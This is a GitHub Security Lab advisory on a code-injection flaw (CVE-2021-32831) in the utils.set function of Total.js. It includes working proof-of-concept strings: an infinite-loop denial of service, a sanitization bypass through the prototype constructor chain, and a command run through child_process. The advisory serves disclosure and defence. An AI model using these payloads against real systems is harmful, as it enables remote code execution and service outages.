<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 21, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-066: DoS and RCE in totaljs</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-04-08: Report sent to maintainers</li>
  <li>2021-06-04: Requested maintainers acknowledgment of the report</li>
  <li>2021-07-01: Re-requested maintainers acknowledgment of the report</li>
  <li>2021-07-07: Deadline expired without maintainers acknowledgment</li>
  <li>2021-07-21: Publication as per our disclosure policy</li>
</ul>

<h2 id="product">Product</h2>

<p>Total.js</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest version available on npm <code class="language-plaintext highlighter-rouge">3.4.8</code>.</p>

<h2 id="details">Details</h2>

<p>Calling the <code class="language-plaintext highlighter-rouge">utils.set</code> function with user-controlled values leads to code-injection.</p>

<h4 id="impact">Impact</h4>

<p>An attacker can execute abitrary javascript code in the context of node.</p>

<h4 id="resources">Resources</h4>

<p><em>Proof of concept: Denial of service</em></p>

<p>The PoC causes a DoS by going into an infinite loop.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">utils</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">total.js/utils</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">utils</span><span class="p">.</span><span class="kd">set</span><span class="p">({},</span><span class="dl">'</span><span class="s1">a;Function(`while(1)1;`)();//</span><span class="dl">'</span><span class="p">);</span> 

<span class="c1">// Alternatively if "Function" is sanitized (similar to how "eval is currently sanitized), then the below will still work: </span>
<span class="nx">utils</span><span class="p">.</span><span class="kd">set</span><span class="p">({},</span><span class="dl">'</span><span class="s1">f[`__` + `proto__`][`cons` + `tructor`][`cons` + `tructor`](`while(1)1;`)();//</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<p><em>Proof of concept: Code execution</em></p>

<p>This PoC creates a file <code class="language-plaintext highlighter-rouge">GHSL</code> inside the current working directory.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">utils</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">total.js/utils</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">utils</span><span class="p">.</span><span class="kd">set</span><span class="p">({},</span><span class="dl">'</span><span class="s1">a;Function(`require("child_process")</span><span class="se">\\</span><span class="s1">x2eexecSync("touch GHSL")`)();//</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32831</li>
</ul>

<h2 id="resources-1">Resources</h2>

<ul>
  <li><a href="https://github.com/totaljs/framework/commit/887b0fa9e162ef7a2dd9cec20a5ca122726373b3">Commit</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered by <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2021-066</code> in any communication regarding this issue.</p>


    